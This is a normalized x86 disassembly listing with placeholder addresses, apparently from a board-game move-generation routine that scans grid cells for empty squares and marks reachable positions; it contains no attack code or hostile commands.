mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x8 ] ecx
cmp ebx 0x9
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] 0x0
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x8 ] ecx
cmp ebx 0x9
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
lea ecx [ ebx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
lea ecx [ ebx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov edi [ rw-data ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 ] 0x1
cmp [ ecx ] 0x20
jne r-xdata
lea ecx [ ebx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi + 0x40 ]
mov edi [ rw-data ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
cmp [ ecx ] 0x20
jne r-xdata
cmp ebx 0x8
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x1
jmp r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x6
mov esi [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
cmp [ esi + ecx * 4 - 0x2c ] 0x20
mov esi [ ebp + 0x14 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x1
jmp r-xdata
mov esi [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
cmp [ esi + ecx * 4 - 0x2c ] 0x20
mov esi [ ebp + 0x14 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx [ rw-data ]
mov ebx [ rw-data ]
inc ecx
add ebx 0xfffffffe
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ecx 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ ebx + ebx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov ebx [ rw-data ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx [ rw-data ]
mov ebx [ rw-data ]
inc ecx
add ebx 0xfffffffe
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ecx 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ ebx + ebx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov ebx [ rw-data ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop [ eax ] eax
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop [ eax + eax ] eax
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ebx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov ecx [ ebx + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 ] 0x1
mov ebx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov ecx [ ebx + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
jl r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x34 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0x8 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0x8 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x1
jl r-xdata
cmp ebx 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 - 0x4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
jmp r-xdata
cmp ebx 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 - 0x4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0xc ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
cmp ebx 0xa
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
cmp ebx 0xa
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x8 ] ecx
cmp ebx 0xa
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x8 ] ecx
cmp ebx 0xa
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
jmp r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ edx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ edx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0xc ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
mov [ rw-data ] 0x1
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
mov [ rw-data ] 0x1
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0xc ]
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx [ rw-data ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ edx + ecx * 4 ] 0x1
sub_408f20
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov [ eax ] 0x0
mov ecx [ edi ]
mov ebx [ ecx * 4 + r--data ]
mov [ rw-data ] ebx
cmp ebx [ ecx * 4 + r--data ]
jg r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0xc ]
nop [ eax + eax ] ax
mov ecx [ ebp + 0x10 ]
inc ebx
mov [ rw-data ] ebx
mov ecx [ ecx ]
cmp ebx [ ecx * 4 + r--data ]
jg r-xdata
mov edx [ edx + ebx * 8 + 0x4 ]
mov [ rw-data ] edx
cmp ebx 0x1f
ja r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
movzx ecx [ ebx + lookup_table_40b844 ]
jmp [ ecx * 4 + jump_table_40b80c ]
mov ecx [ edx + ebx * 8 ]
mov [ rw-data ] ecx
test ecx ecx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ eax + 0x80 ]
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ esi + 0x80 ]
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x1 ]
inc ecx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x1 ]
inc ecx
mov [ ebp - 0x8 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x2 ]
add ecx 0x2
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x2 ]
add ecx 0x2
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov [ ebp - 0x4 ] eax
add eax edx
mov [ ebp - 0x8 ] eax
cmp [ edi + eax * 4 + 0x30 ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov [ ebp - 0x4 ] eax
add eax edx
mov [ ebp - 0x8 ] eax
cmp [ edi + eax * 4 + 0x30 ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0xa
jg r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0xa
jg r-xdata
mov ecx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edx [ ecx + 0x84 ]
inc edx
mov [ rw-data ] edx
cmp edx [ ecx + 0x4 ]
jge r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x3
jg r-xdata
mov ecx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edx [ ecx + 0x84 ]
inc edx
mov [ rw-data ] edx
cmp edx [ ecx + 0x4 ]
jge r-xdata
dec edx
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] edx
mov [ rw-data ] edx
cmp ecx 0x6
jg r-xdata
lea eax [ edx + 0x1 ]
cmp eax 0xa
mov eax [ ebp + 0x1c ]
jg r-xdata
dec edx
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] edx
mov [ rw-data ] edx
cmp ecx 0x6
jg r-xdata
lea eax [ edx + 0x1 ]
cmp eax 0x3
mov eax [ ebp + 0x1c ]
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x2 ]
mov [ ebp - 0x8 ] edi
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
lea eax [ edx + 0x2 ]
cmp eax 0xa
mov eax [ ebp + 0x1c ]
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x2 ]
mov [ ebp - 0x8 ] edi
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
lea eax [ edx + 0x2 ]
cmp eax 0x5
mov eax [ ebp + 0x1c ]
jg r-xdata
mov esi [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
add ecx 0x2
lea esi [ edx + 0x1 ]
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov esi [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
